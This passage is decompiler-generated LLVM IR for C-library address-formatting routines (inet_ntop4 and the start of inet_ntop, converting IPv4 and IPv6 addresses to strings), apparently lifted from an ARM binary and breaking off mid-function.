  %v0_190a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_190a0 = trunc i32 %v0_190a0 to i8
  %v2_190a0 = load i32, i32* @r4, align 4
  %v3_190a0 = add i32 %v2_190a0, 1
  %v4_190a0 = inttoptr i32 %v3_190a0 to i8*
  store i8 %v1_190a0, i8* %v4_190a0, align 1
  %v0_190a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_190a4 = add i32 %v0_190a4, 1
  store i32 %v1_190a4, i32* @r4, align 4
  br label %dec_label_pc_190a8

dec_label_pc_190a8:                               ; preds = %dec_label_pc_1907c, %bb, %dec_label_pc_19094
  %v0_190ec.pre = phi i32 [ %v5_19058, %bb ], [ %v1_190a4, %dec_label_pc_19094 ], [ %v0_190ec.pre.pre, %dec_label_pc_1907c ]
  %v0_190a8 = load i32, i32* %fp.global-to-local, align 4
  %v2_190a8 = icmp eq i32 %v0_190a8, 0
  %v1_190ec.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_190a8, label %dec_label_pc_190ec, label %dec_label_pc_190b0

dec_label_pc_190b0:                               ; preds = %dec_label_pc_190a8
  %v9_190b0 = icmp eq i32 %v0_190ec.pre, %v1_190ec.pre
  %v2_190b4 = sub i32 %v0_190ec.pre, %v0_190a8
  store i32 %v2_190b4, i32* %r0.global-to-local, align 4
  br i1 %v9_190b0, label %dec_label_pc_19120, label %dec_label_pc_190d4.preheader

dec_label_pc_190d4.preheader:                     ; preds = %dec_label_pc_190b0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_190d4

dec_label_pc_190c4:                               ; preds = %dec_label_pc_190d4
  %v0_190c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_190c4 = add i32 %v0_190c4, %v2_190d8
  %v3_190c4 = inttoptr i32 %v2_190c4 to i8*
  %v4_190c4 = load i8, i8* %v3_190c4, align 1
  %v3_190c8 = inttoptr i32 %v2_190dc to i8*
  store i8 %v4_190c4, i8* %v3_190c8, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_190d0 = load i32, i32* %fp.global-to-local, align 4
  %v3_190d0 = load i32, i32* %ip.global-to-local, align 4
  %v4_190d0 = add i32 %v3_190d0, %v2_190d0
  %v5_190d0 = inttoptr i32 %v4_190d0 to i8*
  store i8 0, i8* %v5_190d0, align 1
  %v0_190d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_190d4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_190dc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_190d4

dec_label_pc_190d4:                               ; preds = %dec_label_pc_190d4.preheader, %dec_label_pc_190c4
  %v0_190e8 = phi i32 [ %v1_190ec.pre, %dec_label_pc_190d4.preheader ], [ %v1_190dc.pre, %dec_label_pc_190c4 ]
  %v1_190d8 = phi i32 [ %v2_190b4, %dec_label_pc_190d4.preheader ], [ %v1_190d4.pre, %dec_label_pc_190c4 ]
  %v0_190e0 = phi i32 [ 1, %dec_label_pc_190d4.preheader ], [ %v0_190d4.pre, %dec_label_pc_190c4 ]
  %v2_190d8 = sub i32 %v1_190d8, %v0_190e0
  store i32 %v2_190d8, i32* %ip.global-to-local, align 4
  %v2_190dc = sub i32 %v0_190e8, %v0_190e0
  store i32 %v2_190dc, i32* @lr, align 4
  %v1_190e0 = add i32 %v0_190e0, 1
  store i32 %v1_190e0, i32* %r2.global-to-local, align 4
  %v7_190e4 = icmp slt i32 %v1_190d8, %v0_190e0
  br i1 %v7_190e4, label %dec_label_pc_190e8, label %dec_label_pc_190c4

dec_label_pc_190e8:                               ; preds = %dec_label_pc_190d4
  store i32 %v0_190e8, i32* @r4, align 4
  br label %dec_label_pc_190ec

dec_label_pc_190ec:                               ; preds = %dec_label_pc_190a8, %dec_label_pc_190e8
  %v0_190ec = phi i32 [ %v0_190e8, %dec_label_pc_190e8 ], [ %v0_190ec.pre, %dec_label_pc_190a8 ]
  %v1_190ec = phi i32 [ %v0_190e8, %dec_label_pc_190e8 ], [ %v1_190ec.pre, %dec_label_pc_190a8 ]
  %v9_190ec = icmp eq i32 %v0_190ec, %v1_190ec
  br i1 %v9_190ec, label %dec_label_pc_190f4, label %dec_label_pc_19120

dec_label_pc_190f4:                               ; preds = %dec_label_pc_190ec
  store i32 16, i32* @r2, align 4
  %v2_190f8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_190f8, i32* @r0, align 4
  store i32 %v2_18f5c, i32* @r1, align 4
  %v0_19100 = call i32 @memcpy()
  store i32 %v0_19100, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19124

dec_label_pc_1910c:                               ; preds = %dec_label_pc_18f3c
  %v0_1910c = call i32 @__errno_location()
  store i32 %v0_1910c, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19118 = inttoptr i32 %v0_1910c to i32*
  store i32 97, i32* %v2_19118, align 4
  %v0_19124.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19124

dec_label_pc_19120:                               ; preds = %dec_label_pc_18fbc, %dec_label_pc_18fe4, %dec_label_pc_19004, %dec_label_pc_18ff8, %dec_label_pc_19048, %dec_label_pc_190b0, %dec_label_pc_19034, %dec_label_pc_190ec, %dec_label_pc_18f80, %dec_label_pc_19088, %dec_label_pc_1903c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19124

dec_label_pc_19124:                               ; preds = %dec_label_pc_1910c, %dec_label_pc_190f4, %dec_label_pc_18f48, %dec_label_pc_19120
  %v0_19124 = phi i32 [ %v0_19124.pre, %dec_label_pc_1910c ], [ 1, %dec_label_pc_190f4 ], [ %v4_18f50, %dec_label_pc_18f48 ], [ 0, %dec_label_pc_19120 ]
  store i32 %v0_19124, i32* %r0.global-to-local, align 4
  store i32 %v3_18f24, i32* @r4, align 4
  store i32 %v6_18f24, i32* @r5, align 4
  store i32 %v9_18f24, i32* @r6, align 4
  ret i32 %v0_19124

; uselistorder directives
  uselistorder i32 %v0_19124, { 1, 0 }
  uselistorder i32 %v2_190dc, { 1, 0 }
  uselistorder i32 %v2_190d8, { 1, 0 }
  uselistorder i32 %v0_190e0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_190e8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_190ec.pre, { 0, 2, 1 }
  uselistorder i32 %v0_190ec.pre, { 2, 0, 1 }
  uselistorder i32 %v3_19098, { 1, 0 }
  uselistorder i32 %v0_190ec.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_19070, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1904c, { 1, 0 }
  uselistorder i32 %v3_19010, { 1, 0 }
  uselistorder i32 %v0_19004, { 1, 0, 2 }
  uselistorder i32 %v1_18fb4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_18fac, { 1, 0 }
  uselistorder i32 %v0_18f90, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 13, 12, 9, 8, 11, 10, 2, 1, 15, 14, 17, 16, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 4, 0, 3, 6, 7, 1, 2, 8, 5, 9, 10, 11, 12 }
  uselistorder i32 58, { 3, 0, 1, 2, 4 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder label %dec_label_pc_19124, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_19120, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_190ec, { 1, 0 }
  uselistorder label %dec_label_pc_190d4, { 1, 0 }
  uselistorder label %dec_label_pc_190a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1906c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18fa0, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_19134 = load i32, i32* @r4, align 4
  store i32 %v3_19134, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_24ee4.1349 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_19150 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_19150, i32* @r0, align 4
  %v0_19154 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_19164 = bitcast i32* %stack_var_-51 to i8*
  %v3_19164 = call i32 @__GI_memset(i8* %v2_19164, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1922c = ptrtoint i32* %stack_var_-36 to i32
  %v2_19208 = add i32 %v2_1922c, -17
  br label %dec_label_pc_1922c

dec_label_pc_19174:                               ; preds = %dec_label_pc_1922c
  %v0_19174 = load i32, i32* %fp.global-to-local, align 4
  %v2_19174 = add i32 %v0_19174, %v1_19174
  %v3_19174 = inttoptr i32 %v2_19174 to i8*
  %v4_19174 = load i8, i8* %v3_19174, align 1
  %v6_19174 = zext i8 %v4_19174 to i32
  store i32 %v6_19174, i32* %r4.global-to-local, align 4
  %v1_19178 = add i32 %v0_19178, 1
  store i32 %v1_19178, i32* %r7.global-to-local, align 4
  store i32 %v2_1922c, i32* %r2.global-to-local, align 4
  %v2_19184 = add i32 %v1_19178, %v2_1922c
  store i32 %v2_19184, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_19174, 100
  %v1_1918c = or i8 %div, 48
  %v3_19190 = add i32 %v2_1923c, -17
  %v4_19190 = inttoptr i32 %v3_19190 to i8*
  store i8 %v1_1918c, i8* %v4_19190, align 1
  %v0_19194 = load i32, i32* %r5.global-to-local, align 4
  %v1_19194 = add i32 %v0_19194, -17
  %v2_19194 = inttoptr i32 %v1_19194 to i8*
  %v3_19194 = load i8, i8* %v2_19194, align 1
  %v7_19198 = icmp eq i8 %v3_19194, 48
  %v0_1919c = load i32, i32* %fp.global-to-local, align 4
  %v1_1919c = load i32, i32* %r8.global-to-local, align 4
  %v2_1919c = add i32 %v1_1919c, %v0_1919c
  store i32 %v2_1919c, i32* %sb.global-to-local, align 4
  %v0_191a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_191ac = udiv i32 %v0_191a4, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_191b4 = urem i32 %v2_191ac, 256
  %v2_191b8 = urem i32 %v1_191b4, 10
  %v1_191bc = or i32 %v2_191b8, 48
  %v1_191c0 = trunc i32 %v1_191bc to i8
  br i1 %v7_19198, label %dec_label_pc_191ac, label %dec_label_pc_191d4

dec_label_pc_191ac:                               ; preds = %dec_label_pc_19174
  store i8 %v1_191c0, i8* %v2_19194, align 1
  %v0_191c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_191c4 = add i32 %v0_191c4, -17
  %v2_191c4 = inttoptr i32 %v1_191c4 to i8*
  %v3_191c4 = load i8, i8* %v2_191c4, align 1
  %v7_191c8 = icmp eq i8 %v3_191c4, 48
  br i1 %v7_191c8, label %dec_label_pc_191ac.dec_label_pc_191f8_crit_edge, label %bb

dec_label_pc_191ac.dec_label_pc_191f8_crit_edge:  ; preds = %dec_label_pc_191ac
  %v1_19208.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_191f8

bb:                                               ; preds = %dec_label_pc_191ac
  %v1_191cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_191cc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_191f8

dec_label_pc_191d4:                               ; preds = %dec_label_pc_19174
  %v2_191f0 = load i32, i32* %sl.global-to-local, align 4
  %v3_191f0 = add i32 %v2_191f0, -17
  %v4_191f0 = inttoptr i32 %v3_191f0 to i8*
  store i8 %v1_191c0, i8* %v4_191f0, align 1
  %v0_191f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_191f4 = add i32 %v0_191f4, 1
  store i32 %v1_191f4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_191f8

dec_label_pc_191f8:                               ; preds = %dec_label_pc_191ac.dec_label_pc_191f8_crit_edge, %bb, %dec_label_pc_191d4
  %v1_19208 = phi i32 [ %v1_19208.pre, %dec_label_pc_191ac.dec_label_pc_191f8_crit_edge ], [ %v1_191cc, %bb ], [ %v1_191f4, %dec_label_pc_191d4 ]
  %v0_191f8 = load i32, i32* %sb.global-to-local, align 4
  %v1_191f8 = inttoptr i32 %v0_191f8 to i8*
  %v2_191f8 = load i8, i8* %v1_191f8, align 1
  %tmp17 = urem i8 %v2_191f8, 10
  store i32 %v2_1922c, i32* %ip.global-to-local, align 4
  %v1_1920c = add i32 %v1_19208, 1
  store i32 %v1_1920c, i32* %r1.global-to-local, align 4
  %v1_19210 = or i8 %tmp17, 48
  %v3_19214 = add i32 %v2_19208, %v1_19208
  %v4_19214 = inttoptr i32 %v3_19214 to i8*
  store i8 %v1_19210, i8* %v4_19214, align 1
  %v0_19218 = load i32, i32* %ip.global-to-local, align 4
  %v1_19218 = load i32, i32* %r1.global-to-local, align 4
  %v2_19218 = add i32 %v1_19218, %v0_19218
  store i32 %v2_19218, i32* %r2.global-to-local, align 4
  %v3_19220 = add i32 %v2_19218, -17
  %v4_19220 = inttoptr i32 %v3_19220 to i8*
  store i8 46, i8* %v4_19220, align 1
  %v0_19224 = load i32, i32* %r8.global-to-local, align 4
  %v1_19224 = add i32 %v0_19224, 1
  store i32 %v1_19224, i32* %r8.global-to-local, align 4
  %v0_19228 = load i32, i32* %r1.global-to-local, align 4
  %v1_19228 = add i32 %v0_19228, 1
  br label %dec_label_pc_1922c

dec_label_pc_1922c:                               ; preds = %entry, %dec_label_pc_191f8
  %v0_19178 = phi i32 [ 0, %entry ], [ %v1_19228, %dec_label_pc_191f8 ]
  %v1_19174 = phi i32 [ 0, %entry ], [ %v1_19224, %dec_label_pc_191f8 ]
  store i32 %v2_1922c, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_19178, i32* %r6.global-to-local, align 4
  %v2_1923c = add i32 %v0_19178, %v2_1922c
  store i32 %v2_1923c, i32* %r5.global-to-local, align 4
  %v7_19240 = icmp sgt i32 %v1_19174, 3
  br i1 %v7_19240, label %dec_label_pc_19244, label %dec_label_pc_19174

dec_label_pc_19244:                               ; preds = %dec_label_pc_1922c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_19150, i32* %r4.global-to-local, align 4
  %v3_1924c = add i32 %v2_1923c, -18
  %v4_1924c = inttoptr i32 %v3_1924c to i8*
  store i8 0, i8* %v4_1924c, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_19254 = call i32 @strlen(i8* %tmp18)
  %v2_19258 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_19254, %v2_19258
  br i1 %tmp, label %dec_label_pc_19264, label %dec_label_pc_19278

dec_label_pc_19264:                               ; preds = %dec_label_pc_19244
  %v0_19264 = call i32 @__errno_location()
  %v0_1926c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1926c, i32* %r2.global-to-local, align 4
  %v2_19270 = inttoptr i32 %v0_19264 to i32*
  store i32 28, i32* %v2_19270, align 4
  %v0_19288.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19288

dec_label_pc_19278:                               ; preds = %dec_label_pc_19244
  store i32 %v2_19150, i32* %r1.global-to-local, align 4
  %v3_19280 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_19280, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19288

dec_label_pc_19288:                               ; preds = %dec_label_pc_19264, %dec_label_pc_19278
  %v0_19288 = phi i32 [ %v0_19288.pre, %dec_label_pc_19264 ], [ %v3_19280, %dec_label_pc_19278 ]
  %v2_19290 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_19290, i32* @r4, align 4
  ret i32 %v0_19288

; uselistorder directives
  uselistorder i32 %v2_1923c, { 0, 2, 1 }
  uselistorder i32 %v1_19174, { 1, 0 }
  uselistorder i32 %v0_19178, { 0, 2, 1 }
  uselistorder i32 %v2_1922c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 48, { 0, 8, 9, 1, 4, 5, 6, 10, 11, 12, 13, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_19288, { 1, 0 }
  uselistorder label %dec_label_pc_1922c, { 1, 0 }
  uselistorder label %dec_label_pc_191f8, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_19298 = load i32, i32* @r4, align 4
  store i32 %v3_19298, i32* %stack_var_-32, align 4
  %v6_19298 = load i32, i32* @r5, align 4
  %v25_19298 = ptrtoint i32* %stack_var_-32 to i32
  %v7_1929c = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_1929c, label %dec_label_pc_192c0, label %dec_label_pc_192b4

dec_label_pc_192b4:                               ; preds = %entry
  %v7_192b4 = icmp eq i32 %arg1, 10
  br i1 %v7_192b4, label %dec_label_pc_192d4, label %dec_label_pc_194d4

dec_label_pc_192c0:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_192cc = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_194cc

dec_label_pc_192d4:                               ; preds = %dec_label_pc_192b4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_192e0 = bitcast i32* %stack_var_-64 to i8*
  %v3_192e0 = call i32 @__GI_memset(i8* %v2_192e0, i32 0)
  br label %dec_label_pc_19300

dec_label_pc_192ec:                               ; preds = %dec_label_pc_19300
  %tmp68 = icmp slt i32 %v1_192f0, 0
  %v4_19300 = zext i1 %tmp68 to i32
  %v5_19300 = add i32 %v4_19300, %v1_192f0
  %v3_19304 = sdiv i32 %v5_19300, 2
  %v4_19314 = mul i32 %v3_19304, 4
  %v5_19314 = add i32 %v4_19314, %v25_19298
  %v1_192ec = add i32 %v2_19310, 1
  %v2_192ec = inttoptr i32 %v1_192ec to i8*
  %v3_192ec = load i8, i8* %v2_192ec, align 1
  %v4_192ec = zext i8 %v3_192ec to i32
  %v3_192f0 = inttoptr i32 %v2_19310 to i8*
  %v4_192f0 = load i8, i8* %v3_192f0, align 1
  %v6_192f0 = zext i8 %v4_192f0 to i32
  store i32 %v6_192f0, i32* %r2.global-to-local, align 4
  %v4_192f4 = mul nuw nsw i32 %v6_192f0, 256
  %v5_192f4 = or i32 %v4_192f4, %v4_192ec
  %v2_192f8 = add i32 %v5_19314, -32
  %v3_192f8 = inttoptr i32 %v2_192f8 to i32*
  store i32 %v5_192f4, i32* %v3_192f8, align 4
  %v0_192fc = load i32, i32* %r1.global-to-local, align 4
  %v1_192fc = add i32 %v0_192fc, 2
  br label %dec_label_pc_19300

dec_label_pc_19300:                               ; preds = %dec_label_pc_192d4, %dec_label_pc_192ec
  %v1_192f0 = phi i32 [ 0, %dec_label_pc_192d4 ], [ %v1_192fc, %dec_label_pc_192ec ]
  store i32 %v1_192f0, i32* %r1.global-to-local, align 4
  %v0_19310 = load i32, i32* @r8, align 4
  %v2_19310 = add i32 %v0_19310, %v1_192f0
  store i32 %v2_19310, i32* %r2.global-to-local, align 4
  %v7_19318 = icmp sgt i32 %v1_192f0, 15
  br i1 %v7_19318, label %dec_label_pc_1931c, label %dec_label_pc_192ec

dec_label_pc_1931c:                               ; preds = %dec_label_pc_19300
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1932c

dec_label_pc_1932c:                               ; preds = %dec_label_pc_1931c, %dec_label_pc_19378
  %v0_1936c = phi i32 [ -1, %dec_label_pc_1931c ], [ %v0_193a0, %dec_label_pc_19378 ]
  %v0_1935c = phi i32 [ -1, %dec_label_pc_1931c ], [ %v0_1938c, %dec_label_pc_19378 ]
  %v0_19340 = phi i32 [ -1, %dec_label_pc_1931c ], [ %v0_193408, %dec_label_pc_19378 ]
  %v0_19378 = phi i32 [ 0, %dec_label_pc_1931c ], [ %v1_19378, %dec_label_pc_19378 ]
  %v4_19330 = mul nuw nsw i32 %v0_19378, 4
  %v5_19330 = add i32 %v4_19330, %v25_19298
  %v1_19334 = add i32 %v5_19330, -32
  %v2_19334 = inttoptr i32 %v1_19334 to i32*
  %v3_19334 = load i32, i32* %v2_19334, align 4
  %v2_19338 = icmp eq i32 %v3_19334, 0
  %v7_19340 = icmp eq i32 %v0_19340, -1
  br i1 %v2_19338, label %dec_label_pc_19340, label %dec_label_pc_19354

dec_label_pc_19340:                               ; preds = %dec_label_pc_1932c
  br i1 %v7_19340, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_19340
  store i32 %v0_19378, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_19378

.thread:                                          ; preds = %dec_label_pc_19340
  %v1_1934c.pre = load i32, i32* @r4, align 4
  %v2_1934c = add i32 %v1_1934c.pre, 1
  store i32 %v2_1934c, i32* @r4, align 4
  br label %dec_label_pc_19378

dec_label_pc_19354:                               ; preds = %dec_label_pc_1932c
  br i1 %v7_19340, label %dec_label_pc_19378, label %dec_label_pc_1935c

dec_label_pc_1935c:                               ; preds = %dec_label_pc_19354
  %v7_1935c = icmp eq i32 %v0_1935c, -1
  %v0_19370.pre = load i32, i32* @r4, align 4
  %v1_19364 = load i32, i32* @r7, align 4
  %v7_19368 = icmp sgt i32 %v0_19370.pre, %v1_19364
  %or.cond = or i1 %v7_1935c, %v7_19368
  br i1 %or.cond, label %dec_label_pc_1936c, label %dec_label_pc_19374

dec_label_pc_1936c:                               ; preds = %dec_label_pc_1935c
  store i32 %v0_1936c, i32* @r6, align 4
  store i32 %v0_19370.pre, i32* @r7, align 4
  br label %dec_label_pc_19374

dec_label_pc_19374:                               ; preds = %dec_label_pc_1935c, %dec_label_pc_1936c
  %v0_1935c13 = phi i32 [ %v0_1936c, %dec_label_pc_1936c ], [ %v0_1935c, %dec_label_pc_1935c ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19378

dec_label_pc_19378:                               ; preds = %bb, %.thread, %dec_label_pc_19354, %dec_label_pc_19374
  %v0_193a0 = phi i32 [ %v0_1936c, %.thread ], [ %v0_19378, %bb ], [ %v0_1936c, %dec_label_pc_19354 ], [ -1, %dec_label_pc_19374 ]
  %v0_193408 = phi i32 [ %v0_19340, %.thread ], [ %v0_19378, %bb ], [ -1, %dec_label_pc_19354 ], [ -1, %dec_label_pc_19374 ]
  %v0_1938c = phi i32 [ %v0_1935c, %.thread ], [ %v0_1935c, %bb ], [ %v0_1935c, %dec_label_pc_19354 ], [ %v0_1935c13, %dec_label_pc_19374 ]
  %v1_19378 = add nuw nsw i32 %v0_19378, 1
  store i32 %v1_19378, i32* %r1.global-to-local, align 4
  %v7_19380 = icmp slt i32 %v1_19378, 8
  br i1 %v7_19380, label %dec_label_pc_1932c, label %dec_label_pc_19384

dec_label_pc_19384:                               ; preds = %dec_label_pc_19378
  %v7_19384 = icmp eq i32 %v0_193a0, -1
  br i1 %v7_19384, label %dec_label_pc_193a4, label %dec_label_pc_1938c

dec_label_pc_1938c:                               ; preds = %dec_label_pc_19384
  %v7_1938c = icmp eq i32 %v0_1938c, -1
  %v0_1939c.pre = load i32, i32* @r4, align 4
  br i1 %v7_1938c, label %dec_label_pc_1939c, label %dec_label_pc_19394

dec_label_pc_19394:                               ; preds = %dec_label_pc_1938c
  %v1_19394 = load i32, i32* @r7, align 4
  %v7_19398 = icmp sgt i32 %v0_1939c.pre, %v1_19394
  br i1 %v7_19398, label %dec_label_pc_1939c, label %dec_label_pc_193a4

dec_label_pc_1939c:                               ; preds = %dec_label_pc_1938c, %dec_label_pc_19394
  store i32 %v0_1939c.pre, i32* @r7, align 4
  store i32 %v0_193a0, i32* @r6, align 4
  br label %dec_label_pc_193a4

dec_label_pc_193a4:                               ; preds = %dec_label_pc_19394, %dec_label_pc_19384, %dec_label_pc_1939c
  %v0_193a4 = phi i32 [ %v0_1938c, %dec_label_pc_19394 ], [ %v0_1938c, %dec_label_pc_19384 ], [ %v0_193a0, %dec_label_pc_1939c ]
  %v7_193a4 = icmp eq i32 %v0_193a4, -1
  br i1 %v7_193a4, label %bb49, label %dec_label_pc_193ac

dec_label_pc_193ac:                               ; preds = %dec_label_pc_193a4
  %v0_193ac = load i32, i32* @r7, align 4
  %v7_193b0 = icmp slt i32 %v0_193ac, 2
  br i1 %v7_193b0, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_193ac
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_193a4, %dec_label_pc_193ac, %bb48
  %v0_193c023 = phi i32 [ %v0_193a4, %dec_label_pc_193a4 ], [ %v0_193a4, %dec_label_pc_193ac ], [ -1, %bb48 ]
  %v2_193b4 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_193b4, i32* @r4, align 4
  %v9_19420 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_193c063 = icmp eq i32 %v0_193c023, -1
  br label %dec_label_pc_193c0

dec_label_pc_193c0:                               ; preds = %bb49, %dec_label_pc_19474
  %v7_193c067 = phi i1 [ %v7_193c063, %bb49 ], [ %v7_193c0, %dec_label_pc_19474 ]
  %v0_193ec66 = phi i32 [ 0, %bb49 ], [ %v1_19474, %dec_label_pc_19474 ]
  %v1_193dc65 = phi i32 [ %v0_193c023, %bb49 ], [ %v0_193c0.pre, %dec_label_pc_19474 ]
  %v3_193f464 = phi i32 [ %v2_193b4, %bb49 ], [ %v3_193e424, %dec_label_pc_19474 ]
  br i1 %v7_193c067, label %dec_label_pc_193ec, label %dec_label_pc_193c8

dec_label_pc_193c8:                               ; preds = %dec_label_pc_193c0
  %v9_193c8 = icmp eq i32 %v0_193ec66, %v1_193dc65
  %v5_193cc = icmp slt i32 %v0_193ec66, %v1_193dc65
  br i1 %v5_193cc, label %dec_label_pc_193ec, label %dec_label_pc_193d0

dec_label_pc_193d0:                               ; preds = %dec_label_pc_193c8
  %v1_193d0 = load i32, i32* @r7, align 4
  %v2_193d0 = add i32 %v1_193d0, %v1_193dc65
  %v6_193d8 = icmp slt i32 %v0_193ec66, %v2_193d0
  br i1 %v6_193d8, label %dec_label_pc_193dc, label %dec_label_pc_193ec

dec_label_pc_193dc:                               ; preds = %dec_label_pc_193d0
  br i1 %v9_193c8, label %bb51, label %dec_label_pc_19474

bb51:                                             ; preds = %dec_label_pc_193dc
  %v4_193e4 = inttoptr i32 %v3_193f464 to i8*
  store i8 58, i8* %v4_193e4, align 1
  %v5_193e4 = load i32, i32* @r4, align 4
  %v6_193e4 = add i32 %v5_193e4, 1
  store i32 %v6_193e4, i32* @r4, align 4
  br label %dec_label_pc_19474

dec_label_pc_193ec:                               ; preds = %dec_label_pc_193d0, %dec_label_pc_193c8, %dec_label_pc_193c0
  %v2_193ec = icmp eq i32 %v0_193ec66, 0
